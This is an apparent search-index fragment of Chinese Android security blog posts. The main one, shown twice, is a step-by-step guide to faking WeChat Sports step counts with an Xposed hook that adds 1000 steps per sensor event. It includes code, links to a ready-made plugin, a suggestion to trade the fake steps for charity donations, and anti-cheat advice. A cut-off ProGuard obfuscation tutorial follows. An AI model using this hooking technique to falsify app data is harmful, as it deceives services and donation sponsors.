\u6211\u4eec\u662f\u5982\u4f55\u4f5c\u5f0a\u7684\u5462?\u7b80\u5355\u6765\u8bf4,\u5f53\u5fae\u4fe1\u8fd0\u52a8\u60f3\u8981\u77e5\u9053\u6211\u4eec\u8d70\u4e86\u591a\u5c11\u6b65\u7684\u65f6\u5019,\u5fae\u4fe1app\u4f1a\u8be2\u95eeandroid\u7cfb\u7edf\u7684\u8ba1\u6570\u4f20\u611f\u5668,\u968f\u540e\u8ba1\u6570\u4f20\u611f\u5668\u4f1a\u8fd4\u56de\u6211\u4eec\u884c\u8d70\u7684\u6b65\u6570\u3002\u56e0\u6b64,\u5982\u679c\u6211\u4eec\u80fd\u591f\u62e6\u622a\u5fae\u4fe1\u8fd0\u52a8\u548c\u8ba1\u6570\u4f20\u611f\u5668\u4e4b\u95f4\u7684\u5bf9\u8bdd,\u7136\u540e\u4f2a\u9020\u4e00\u4e2a\u6b65\u6570\u4f20\u9012\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f5c\u5f0a\u6548\u679c\u3002 \u5177\u4f53\u600e\u4e48\u505a\u5462?\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7528Xposed\u6846\u67b6\u6765hook\u8ba1\u6570\u4f20\u611f\u5668\u7684\u961f\u5217\u51fd\u6570dispatchSensorEvent(),\u8fd9\u4e2a\u51fd\u6570\u5728 android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u4e2d\u3002\u968f\u540e\u5728\u5fae\u4fe1\u8fd0\u52a8\u6bcf\u6b21\u8be2\u95ee\u884c\u8d70\u6b65\u6570\u7684\u65f6\u5019,\u6211\u4eec\u5148\u83b7\u53d6\u5f53\u524d\u6b65\u6570,\u7136\u540e\u5728\u76ee\u524d\u7684\u6b65\u6570\u7684\u57fa\u7840\u4e0a\u52a01000\u6b65,\u7136\u540e\u5c06\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u3002\u5fae\u4fe1\u8fd0\u52a8\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u6211\u4eec\u8fd0\u52a8\u4e861000\u6b65,\u4ece\u800c\u8fbe\u5230\u4e86\u6b3a\u9a97\u7684\u6548\u679c\u3002 \u5173\u952e\u4ee3\u7801\u5982\u4e0b: \u9996\u5148hook android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u7684dispatchSensorEvent()\u51fd\u6570: final Class<?> sensorEL = findClass(\"android.hardware.SystemSensorManager$SensorEventQueue\",lpparam.classLoader); XposedBridge.hookAllMethods(sensorEL, \"dispatchSensorEvent\", new XC_MethodHook() \u63a5\u7740\u6211\u4eec\u5728\u8bb0\u6b65\u4f20\u611f\u5668\u628a\u6b65\u6570\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u4e4b\u524d,\u5c06\u8fd4\u56de\u7684\u6b65\u6570\u52a0\u4e0a1000\u6b65: protected void beforeHookedMethod(MethodHookParam param) throws Throwable { XposedBridge.log(\" mzheng Hooked method: \" + param.method); ((float[]) param.args[1])[0]=((float[]) param.args[1])[0]+1000*WechatStepCount; WechatStepCount+=1; \u2026 \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4f20\u611f\u5668\u7684\u63a5\u53e3\u83b7\u53d6\u4e00\u4e9b\u6570\u636e\u7684\u4fe1\u606f: Sensor ss = ((SparseArray<Sensor>) field.get(0)).get(handle); XposedBridge.log(\" SensorEvent: sensor=\" + ss); enter image description here \u6bd4\u5982\u8bf4x\u5c31\u4ee3\u8868\u5f00\u673a\u4ee5\u6765\u884c\u8d70\u7684\u6b65\u6570,timestamp\u662f\u83b7\u53d6\u6b65\u6570\u65f6\u5019\u7684\u65f6\u95f4\u6233\u7b49\u3002 \u53e6\u5916,\u6211\u4eec\u4e0d\u4ec5\u5728android\u4e0a\u53ef\u4ee5hook\u8ba1\u6b65\u5668,\u5728iOS\u4e0a\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u8d8a\u72f1\u540ehook iHealth\u7684API\u63a5\u53e3\u8fbe\u5230\u540c\u6837\u7684\u4f5c\u5f0a\u6548\u679c,\u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u7ee7\u7eed\u7814\u7a76\u3002 0x03\u5fae\u4fe1\u8fd0\u52a8\u53cd\u4f5c\u5f0a\u5efa\u8bae \u5982\u4f55\u9632\u6b62\u8fd9\u79cd\u4f5c\u5f0a\u53d1\u751f\u5462?\u6211\u7684\u7b2c\u4e00\u4e2a\u5efa\u8bae\u662f\u52a0\u5f3a\u670d\u52a1\u5668\u7aef\u7684\u903b\u8f91\u68c0\u6d4b\u529f\u80fd\u3002\u6bd4\u5982\u8bf4\u4e00\u4e2a\u4eba\u662f\u4e0d\u53ef\u80fd\u5341\u5206\u949f\u5185\u8d70\u4e00\u4e07\u6b65\u7684,\u5982\u679c\u4ed6\u505a\u5230\u4e86,\u90a3\u4e48\u4ed6\u4e00\u5b9a\u662f\u5728\u4f5c\u5f0a\u3002 \u6211\u7684\u7b2c\u4e8c\u4e2a\u5efa\u8bae\u662f\u589e\u52a0\u5bf9hook\u7684\u68c0\u6d4b\u529f\u80fd\u3002\u867d\u7136\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u4e0b\u5f0a\u65e0\u975e\u5c31\u662f\u6ee1\u8db3\u4e00\u4e0b\u5927\u5bb6\u4e89\u5f3a\u597d\u80dc\u7684\u865a\u8363\u5fc3,\u5e76\u4e0d\u4f1a\u5bf9\u5927\u5bb6\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u635f\u5931\u3002\u4f46\u662f\u65e2\u7136\u5fae\u4fe1\u8fd0\u52a8\u53ef\u4ee5\u88abhook,\u540c\u6837\u4e5f\u610f\u5473\u7740\u8bed\u97f3\u804a\u5929,\u5fae\u4fe1\u652f\u4ed8\u7b49\u529f\u80fd\u4e5f\u662f\u53ef\u4ee5\u88abhook\u7684,\u5f53\u9ed1\u5ba2\u5229\u7528hook\u6280\u672f\u5bf9\u4f60\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u5371\u5bb3\u7684\u65f6\u5019\u53ef\u5c31\u4e0d\u662f\u90a3\u4e48\u597d\u73a9\u7684\u4e8b\u4e86\u3002\u4e4b\u524d\u6211\u4eec\u5728Hacking Team\u4e8b\u4ef6\u4e2d\u4e5f\u4eb2\u773c\u76ee\u7779\u4e86\u5229\u7528hook\u6280\u672f\u6765\u83b7\u53d6\u5fae\u4fe1\u8bed\u97f3\u6d88\u606f\u7684android\u6728\u9a6c,\u6240\u4ee5\u4e00\u5b9a\u8981\u589e\u52a0\u9488\u5bf9hook\u7684\u68c0\u6d4b\u624d\u884c\u3002 0x04 \u603b\u7ed3 \u6b64\u6587\u53ea\u662f\u4ecb\u7ecd\u4e86Android Hook\u7684\u7b80\u5355\u573a\u666f\u5e94\u7528,\u5173\u4e8eAndroid Hook\u7684\u539f\u7406\u4ee5\u53ca\u66f4\u591a\u7684\u5229\u7528\u65b9\u5f0f,\u6bd4\u5982\u8bf4\u8c03\u8bd5,\u5173\u952eAPI\u62e6\u622a,\u5916\u6302\u7b49\u6280\u5de7,\u656c\u8bf7\u671f\u5f85WooYun Book\u7cfb\u5217\u7684\u6587\u7ae0\u300a\u5b89\u5353\u52a8\u6001\u8c03\u8bd5\u4e03\u79cd\u6b66\u5668\u4e4b\u79bb\u522b\u94a9 \u2013 Hooking\u300b\u3002 https://github.com/zhengmin1989/TheSevenWeapons 0x05 \u53c2\u8003\u6587\u7ae0 Android.Hook\u6846\u67b6xposed\u7bc7(Http\u6d41\u91cf\u76d1\u63a7) \u4eba\u624b\u4e00\u4efd\u6838\u6b66\u5668 \u2013 Hacking Team \u6cc4\u9732(\u5f00\u6e90)\u8d44\u6599\u5bfc\u89c8\u624b\u518c \u539f\u6587\u94fe\u63a5\uff1a https://www.anquanke.com/post/id/82323","title":"\u624b\u628a\u624b\u6559\u4f60\u5f53\u5fae\u4fe1\u8fd0\u52a8\u7b2c\u4e00\u540d\u2013\u5229\u7528AndroidHook\u8fdb\u884c\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a"},{"location":"Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/#android-hook","text":"0x00 \u5e8f \u968f\u7740\u5e26\u534f\u5904\u7406\u5668\u548c\u4e70\u624b\u73af\u7684\u4eba\u8d8a\u6765\u8d8a\u591a,\u5fae\u4fe1\u8fd0\u52a8\u4e00\u4e0b\u5b50\u706b\u4e86,\u53ea\u8981\u4f60\u5728\u5fae\u4fe1\u5173\u6ce8\u5fae\u4fe1\u8fd0\u52a8,\u624b\u673a\u5c31\u80fd\u81ea\u52a8\u8bb0\u5f55\u4f60\u6bcf\u5929\u884c\u8d70\u7684\u6b65\u6570,\u8fd8\u53ef\u4ee5\u8ddf\u670b\u53cb\u5708\u91cc\u7684\u597d\u53cbPK\u8fd0\u52a8\u91cf\u3002\u5e76\u4e14\u6bcf\u65e5\u6392\u540d\u7b2c\u4e00\u7684\u7528\u6237\u53ef\u4ee5\u5360\u636e\u5f53\u65e5\u6392\u884c\u699c\u7684\u5c01\u9762\u3002\u8fd9\u5145\u5206\u6fc0\u8d77\u4e86\u5927\u5bb6\u7684\u6c42\u80dc\u7684\u6b32\u671b,\u4e8e\u662f\u51fa\u73b0\u4e86\u5f88\u591a\u52b1\u5fd7\u7684\u548c\u60b2\u4f24\u7684\u6545\u4e8b\u2026\u2026 0x01\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5 \u5176\u5b9e\u60f3\u8981\u62ff\u7b2c\u4e00\u6ca1\u6709\u90a3\u4e48\u9ebb\u70e6,\u53ea\u8981\u4f1a\u4e00\u70b9Android\u7684Hook\u77e5\u8bc6,\u5c31\u53ef\u4ee5\u8f7b\u677e\u51b2\u5230\u6392\u884c\u699c\u7b2c\u4e00\u540d\u3002\u63a5\u4e0b\u6765\u6211\u5c31\u624b\u628a\u624b\u6559\u4f60\u5982\u4f55\u53d8\u6210\u7b2c\u4e00\u3002 \u9996\u5148\u6211\u4eec\u9700\u8981\u4e00\u53f0\u5e26\u534f\u5904\u7406\u7684root\u540e\u7684android\u673a\u5668,\u6bd4\u5982\u8bf4nexus 5\u3002\u7136\u540e\u6211\u4eec\u88c5\u4e0a\u4f5c\u5f0a\u7528\u7684XPosed Hook\u6846\u67b6\u548c\u4f5c\u5f0a\u63d2\u4ef6\u3002\u8fd9\u4e24\u4e2aapk\u53ef\u4ee5\u5728\u6211\u7684github\u4e0a\u4e0b\u8f7d\u5230\u3002 https://github.com/zhengmin1989/WechatSportCheat \u4e0b\u8f7d\u5b8c\u540e,\u5148\u5b89\u88c5XPosed.apk\u3002\u63a5\u7740\u6253\u5f00Xposed,\u9009\u62e9\u201c\u5b89\u88c5/\u66f4\u65b0\u201d,\u7136\u540e\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u91cd\u542f\u5b8c\u540e,\u518d\u5b89\u88c5xposedwechat.apk\u63d2\u4ef6\u3002\u7136\u540e\u6253\u5f00Xposed\u7684\u6a21\u5757\u754c\u9762,\u4f1a\u770b\u5230xposedwechat\u8fd9\u4e2a\u63d2\u4ef6\u3002\u6211\u4eec\u5728\u8fd9\u91cc\u5c06\u5b83\u9009\u4e2d,\u7136\u540e\u518d\u6839\u636e\u63d0\u793a\u91cd\u542f\u624b\u673a\u3002 \u63a5\u4e0b\u6765\u5c31\u662f\u89c1\u8bc1\u5947\u8ff9\u7684\u65f6\u523b\u2026\u4f60\u968f\u610f\u8d70\u4e24\u6b65,\u7136\u540e\u6253\u5f00\u5fae\u4fe1\u8fd0\u52a8,\u54a6,\u600e\u4e48\u5c31\u591a\u4e861000\u6b65?\u518d\u968f\u4fbf\u8d70\u51e0\u6b65,\u54a6,\u600e\u4e48\u53c8\u591a\u4e861000\u6b65?\u2026 demo\u89c6\u9891\u5982\u4e0b: \u4ec5\u4ec5\u5237\u6b65\u6570\u8fd8\u662f\u4e0d\u591f\u8fc7\u763e\u5427?\u5fae\u4fe1\u8fd0\u52a8\u8fd8\u63a8\u51fa\u4e86\u76ca\u884c\u5bb6\u6d3b\u52a8,\u53ef\u4ee5\u7528\u6bcf\u5929\u7684\u6b65\u6570\u6362\u53d6\u7231\u5fc3\u6350\u6b3e\u3002\u6709\u4e86\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u5927\u6cd5,\u6211\u4eec\u53ef\u4ee5\u6bcf\u5929\u5728\u5bb6\u968f\u4fbf\u8d70\u51e0\u6b65\u7136\u540e\u6362\u53d6\u7231\u5fc3\u6350\u6b3e(\u5982\u56fe\u6240\u793a)\u3002 0x02 \u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a\u539f\u7406 \u6211\u4eec\u662f\u5982\u4f55\u4f5c\u5f0a\u7684\u5462?\u7b80\u5355\u6765\u8bf4,\u5f53\u5fae\u4fe1\u8fd0\u52a8\u60f3\u8981\u77e5\u9053\u6211\u4eec\u8d70\u4e86\u591a\u5c11\u6b65\u7684\u65f6\u5019,\u5fae\u4fe1app\u4f1a\u8be2\u95eeandroid\u7cfb\u7edf\u7684\u8ba1\u6570\u4f20\u611f\u5668,\u968f\u540e\u8ba1\u6570\u4f20\u611f\u5668\u4f1a\u8fd4\u56de\u6211\u4eec\u884c\u8d70\u7684\u6b65\u6570\u3002\u56e0\u6b64,\u5982\u679c\u6211\u4eec\u80fd\u591f\u62e6\u622a\u5fae\u4fe1\u8fd0\u52a8\u548c\u8ba1\u6570\u4f20\u611f\u5668\u4e4b\u95f4\u7684\u5bf9\u8bdd,\u7136\u540e\u4f2a\u9020\u4e00\u4e2a\u6b65\u6570\u4f20\u9012\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u7684\u4f5c\u5f0a\u6548\u679c\u3002 \u5177\u4f53\u600e\u4e48\u505a\u5462?\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7528Xposed\u6846\u67b6\u6765hook\u8ba1\u6570\u4f20\u611f\u5668\u7684\u961f\u5217\u51fd\u6570dispatchSensorEvent(),\u8fd9\u4e2a\u51fd\u6570\u5728 android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u4e2d\u3002\u968f\u540e\u5728\u5fae\u4fe1\u8fd0\u52a8\u6bcf\u6b21\u8be2\u95ee\u884c\u8d70\u6b65\u6570\u7684\u65f6\u5019,\u6211\u4eec\u5148\u83b7\u53d6\u5f53\u524d\u6b65\u6570,\u7136\u540e\u5728\u76ee\u524d\u7684\u6b65\u6570\u7684\u57fa\u7840\u4e0a\u52a01000\u6b65,\u7136\u540e\u5c06\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u3002\u5fae\u4fe1\u8fd0\u52a8\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u6211\u4eec\u8fd0\u52a8\u4e861000\u6b65,\u4ece\u800c\u8fbe\u5230\u4e86\u6b3a\u9a97\u7684\u6548\u679c\u3002 \u5173\u952e\u4ee3\u7801\u5982\u4e0b: \u9996\u5148hook android.hardware.SystemSensorManager$SensorEventQueue\u8fd9\u4e2a\u7c7b\u7684dispatchSensorEvent()\u51fd\u6570: final Class<?> sensorEL = findClass(\"android.hardware.SystemSensorManager$SensorEventQueue\",lpparam.classLoader); XposedBridge.hookAllMethods(sensorEL, \"dispatchSensorEvent\", new XC_MethodHook() \u63a5\u7740\u6211\u4eec\u5728\u8bb0\u6b65\u4f20\u611f\u5668\u628a\u6b65\u6570\u4fe1\u606f\u8fd4\u56de\u7ed9\u5fae\u4fe1\u8fd0\u52a8\u4e4b\u524d,\u5c06\u8fd4\u56de\u7684\u6b65\u6570\u52a0\u4e0a1000\u6b65: protected void beforeHookedMethod(MethodHookParam param) throws Throwable { XposedBridge.log(\" mzheng Hooked method: \" + param.method); ((float[]) param.args[1])[0]=((float[]) param.args[1])[0]+1000*WechatStepCount; WechatStepCount+=1; \u2026 \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4f20\u611f\u5668\u7684\u63a5\u53e3\u83b7\u53d6\u4e00\u4e9b\u6570\u636e\u7684\u4fe1\u606f: Sensor ss = ((SparseArray<Sensor>) field.get(0)).get(handle); XposedBridge.log(\" SensorEvent: sensor=\" + ss); enter image description here \u6bd4\u5982\u8bf4x\u5c31\u4ee3\u8868\u5f00\u673a\u4ee5\u6765\u884c\u8d70\u7684\u6b65\u6570,timestamp\u662f\u83b7\u53d6\u6b65\u6570\u65f6\u5019\u7684\u65f6\u95f4\u6233\u7b49\u3002 \u53e6\u5916,\u6211\u4eec\u4e0d\u4ec5\u5728android\u4e0a\u53ef\u4ee5hook\u8ba1\u6b65\u5668,\u5728iOS\u4e0a\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u8d8a\u72f1\u540ehook iHealth\u7684API\u63a5\u53e3\u8fbe\u5230\u540c\u6837\u7684\u4f5c\u5f0a\u6548\u679c,\u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u7ee7\u7eed\u7814\u7a76\u3002 0x03\u5fae\u4fe1\u8fd0\u52a8\u53cd\u4f5c\u5f0a\u5efa\u8bae \u5982\u4f55\u9632\u6b62\u8fd9\u79cd\u4f5c\u5f0a\u53d1\u751f\u5462?\u6211\u7684\u7b2c\u4e00\u4e2a\u5efa\u8bae\u662f\u52a0\u5f3a\u670d\u52a1\u5668\u7aef\u7684\u903b\u8f91\u68c0\u6d4b\u529f\u80fd\u3002\u6bd4\u5982\u8bf4\u4e00\u4e2a\u4eba\u662f\u4e0d\u53ef\u80fd\u5341\u5206\u949f\u5185\u8d70\u4e00\u4e07\u6b65\u7684,\u5982\u679c\u4ed6\u505a\u5230\u4e86,\u90a3\u4e48\u4ed6\u4e00\u5b9a\u662f\u5728\u4f5c\u5f0a\u3002 \u6211\u7684\u7b2c\u4e8c\u4e2a\u5efa\u8bae\u662f\u589e\u52a0\u5bf9hook\u7684\u68c0\u6d4b\u529f\u80fd\u3002\u867d\u7136\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u4e0b\u5f0a\u65e0\u975e\u5c31\u662f\u6ee1\u8db3\u4e00\u4e0b\u5927\u5bb6\u4e89\u5f3a\u597d\u80dc\u7684\u865a\u8363\u5fc3,\u5e76\u4e0d\u4f1a\u5bf9\u5927\u5bb6\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u635f\u5931\u3002\u4f46\u662f\u65e2\u7136\u5fae\u4fe1\u8fd0\u52a8\u53ef\u4ee5\u88abhook,\u540c\u6837\u4e5f\u610f\u5473\u7740\u8bed\u97f3\u804a\u5929,\u5fae\u4fe1\u652f\u4ed8\u7b49\u529f\u80fd\u4e5f\u662f\u53ef\u4ee5\u88abhook\u7684,\u5f53\u9ed1\u5ba2\u5229\u7528hook\u6280\u672f\u5bf9\u4f60\u7684\u9690\u79c1\u548c\u8d22\u4ea7\u4ea7\u751f\u5371\u5bb3\u7684\u65f6\u5019\u53ef\u5c31\u4e0d\u662f\u90a3\u4e48\u597d\u73a9\u7684\u4e8b\u4e86\u3002\u4e4b\u524d\u6211\u4eec\u5728Hacking Team\u4e8b\u4ef6\u4e2d\u4e5f\u4eb2\u773c\u76ee\u7779\u4e86\u5229\u7528hook\u6280\u672f\u6765\u83b7\u53d6\u5fae\u4fe1\u8bed\u97f3\u6d88\u606f\u7684android\u6728\u9a6c,\u6240\u4ee5\u4e00\u5b9a\u8981\u589e\u52a0\u9488\u5bf9hook\u7684\u68c0\u6d4b\u624d\u884c\u3002 0x04 \u603b\u7ed3 \u6b64\u6587\u53ea\u662f\u4ecb\u7ecd\u4e86Android Hook\u7684\u7b80\u5355\u573a\u666f\u5e94\u7528,\u5173\u4e8eAndroid Hook\u7684\u539f\u7406\u4ee5\u53ca\u66f4\u591a\u7684\u5229\u7528\u65b9\u5f0f,\u6bd4\u5982\u8bf4\u8c03\u8bd5,\u5173\u952eAPI\u62e6\u622a,\u5916\u6302\u7b49\u6280\u5de7,\u656c\u8bf7\u671f\u5f85WooYun Book\u7cfb\u5217\u7684\u6587\u7ae0\u300a\u5b89\u5353\u52a8\u6001\u8c03\u8bd5\u4e03\u79cd\u6b66\u5668\u4e4b\u79bb\u522b\u94a9 \u2013 Hooking\u300b\u3002 https://github.com/zhengmin1989/TheSevenWeapons 0x05 \u53c2\u8003\u6587\u7ae0 Android.Hook\u6846\u67b6xposed\u7bc7(Http\u6d41\u91cf\u76d1\u63a7) \u4eba\u624b\u4e00\u4efd\u6838\u6b66\u5668 \u2013 Hacking Team \u6cc4\u9732(\u5f00\u6e90)\u8d44\u6599\u5bfc\u89c8\u624b\u518c \u539f\u6587\u94fe\u63a5\uff1a https://www.anquanke.com/post/id/82323","title":"\u624b\u628a\u624b\u6559\u4f60\u5f53\u5fae\u4fe1\u8fd0\u52a8\u7b2c\u4e00\u540d \u2013 \u5229\u7528Android Hook\u8fdb\u884c\u5fae\u4fe1\u8fd0\u52a8\u4f5c\u5f0a"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/","text":"\u65e5\u79ef\u6708\u7d2f\uff1aProguard\u8fdb\u884c\u6e90\u4ee3\u7801\u6df7\u6dc6\u548c\u5d29\u6e83\u65e5\u5fd7\u53cd\u6df7\u6dc6 \u5728\u5b9e\u9645\u7684\u5f00\u53d1\u6210\u4ea7\u54c1apk\u7684\u53d1\u5e03\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u4f7f\u7528\u5230\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002\u4e0d\u8fc7\u5728\u8bb2\u89e3\u5982\u4f55\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u4e4b\u524d\uff0c\u6211\u5148\u8ddf\u5927\u5bb6\u6f14\u793a\u4e00\u4e0b\u53cd\u7f16\u8bd1\u7684\u8fc7\u7a0b\uff0c\u8fd9\u6837\u624d\u80fd\u8ba9\u5927\u5bb6\u660e\u767d\u4e3a\u4ec0\u4e48\u9700\u8981\u8fdb\u884c\u4ee3\u7801\u6df7\u6dc6\u3002 \u4e00\u3001\u4ee3\u7801\u53cd\u7f16\u8bd1 1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\u6211\u4eec\u51c6\u5907\u597d\u4e00\u4e2a\u9879\u76ee\u7684apk\u6587\u4ef6\uff08\u672a\u8fdb\u884c\u6df7\u6dc6\u6253\u5305\uff09\u3001dex2jar\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://code.google.com/p/dex2jar/ \uff09\u3001jd-gui\u5de5\u5177\uff08\u4e0b\u8f7d\u5730\u5740\uff1a http://jd-gui.softpedia.com/ \uff09\u3002 2.\u83b7\u53d6CodeMixTest.apk\u4e2d\u7684classes.dex\u6587\u4ef6 \u5c06CodeMixTest.apk\u89e3\u538b\uff0c\u8fd9\u91cc\u6211\u4eec\u4e3a\u4e86\u65b9\u4fbf\u5c31\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\u4e0b\u3002\u5728\u89e3\u538b\u51fa\u7684\u6587\u4ef6\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u89c1\u6709\u4e00\u4e2aclasses.dex\u6587\u4ef6\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u7684\u6e90\u4ee3\u7801\u6253\u5305\u751f\u6210\u7684\u6587\u4ef6\u3002 3.\u4f7f\u7528dex2jar\u5de5\u5177\u8fd8\u539fjar\u6587\u4ef6 dex2jar\u5de5\u5177\u7684\u4f5c\u7528\u5c31\u662f\u5c06class.dex\u6587\u4ef6\u8fd8\u539f\u6210.jar\u6587\u4ef6\u3002\u5148\u5c06dex2jar-0.0.9.15.zip\u89e3\u538b\uff0c\u7136\u540e\u5c06\u4e0a\u9762\u83b7\u5f97\u7684classes.dex\u6587\u4ef6\u62f7\u8d1d\u81f3\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\u3002 \u67e5\u770b\u89e3\u538b\u76ee\u5f55\u4e2d\uff0c\u6709dex2jar.bat\u6587\u4ef6\u3002 \u542f\u52a8cmd\uff0c\u8fdb\u5165\u5230dex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\u547d\u4ee4\uff1adex2jar.bat classes.dex\uff0c\u6709\u5982\u4e0b\u7ed3\u679c\u3002 \u67e5\u770bdex2jar\u5de5\u5177\u89e3\u538b\u7684\u76ee\u5f55\u4e2d\uff0c\u751f\u6210\u4e86\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684classes_dex2jar.jar\u6587\u4ef6\u3002 4.\u4f7f\u7528jd-gui\u5de5\u5177\u67e5\u770bjar\u6587\u4ef6 \u5c06jd-gui-0.3.5.windows.zip\u5de5\u5177\u89e3\u538b\uff0c\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u76f4\u63a5\u89e3\u538b\u5230\u5f53\u524d\u6587\u4ef6\u5939\uff0c\u6211\u4eec\u4f1a\u770b\u89c1\u4e00\u4e2ajd-gui.exe\u6587\u4ef6\u3002 \u53cc\u51fbjd-gui.exe\uff0c\u4f7f\u7528\u5de5\u5177\u6253\u5f00\u524d\u9762\u6211\u4eec\u83b7\u5f97\u7684classes_dex2jar.jar\u6587\u4ef6\u3002\u53ef\u4ee5\u6e05\u695a\u7684\u770b\u89c1\u6e90\u4ee3\u7801\u3002 \u662f\u4f01\u4e1a\u771f\u5b9e\u7684\u9879\u76ee\u4e2d\uff0c\u5982\u679c\u4e0d\u7ecf\u8fc7\u4ee3\u7801\u6df7\u6dc6\uff0c\u4f60\u7684\u6e90\u7801\u5c31\u5982\u6b64\u8d64\u88f8\u88f8\u7684\u66b4\u9732\u7740\u3002\u8fd9\u6837\u5bf9\u4e8e\u516c\u53f8\u6765\u8bf4\u662f\u975e\u5e38\u4e0d\u5b89\u5168\u7684\uff0c\u5e76\u4e14\u4e0d\u60f3\u53d1\u751f\u7684\u60c5\u51b5\u3002\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u770b\u89c1\u4e86\u53cd\u7f16\u8bd1\u5982\u6b64\u7684\u5a01\u529b\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u4ec0\u4e48\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u770b\u4e0b\u9762\u8bb2\u89e3\u3002 \u4e8c\u3001\u4ee3\u7801\u6df7\u6dc6 1.\u51c6\u5907\u5de5\u4f5c \u9996\u5148\uff0c\u6211\u4eec\u5f97\u5c06\u6211\u4eec\u7684\u9879\u76ee\u6e90\u7801\u3001proguard\u5de5\u5177\uff08\u653e\u5fc3\u8fd9\u4e2a\u5de5\u5177Google\u5df2\u7ecf\u5728sdk\u4e2d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\uff0c\u5728sdk\\tools\u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\uff09\u3001proguard.cfg\u6587\u4ef6\uff08\u8be5\u6587\u4ef6\u5b9a\u4e49\u4e86\u6df7\u6dc6\u7684\u89c4\u5219\uff0c\u521b\u5efa2.3\u4ee5\u4e0a\u9879\u76ee\u81ea\u52a8\u751f\u6210\uff0c\u6216\u8005\u5728\u7f51\u4e0a\u53ef\u4ee5\u5f88\u5bb9\u6613\u4e0b\u8f7d\u5230\uff09\u3002 2.\u5728\u4f60\u7684\u9879\u76ee\u4e2d\u6dfb\u52a0proguard.cfg\u6587\u4ef6 \u8be5\u6587\u4ef6Google\u516c\u53f8\u5df2\u7ecf\u4e3a\u6211\u4eec\u51c6\u5907\u597d\u4e86\uff0c\u521b\u5efa\u9879\u76ee\u65f6\uff0c\u5728\u9879\u76ee\u7684\u6839\u76ee\u5f55\u4e0b\u5c31\u6709\u4e86\uff0c\u4f46\u662f\u662f\u4ece2.3\u5f00\u59cb\u7684\u3002\u4e0d\u8fc7\u6211\u4eec\u57fa\u4e8e2.2\u7684\u9879\u76ee\u53ea\u9700\u8981\u5c06\u8be5\u6587\u4ef6\u62f7\u8d1d\u5230\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u5373\u53ef\u3002 3.\u4fee\u6539\u9879\u76ee\u7684default.properties\u914d\u7f6e\u6587\u4ef6 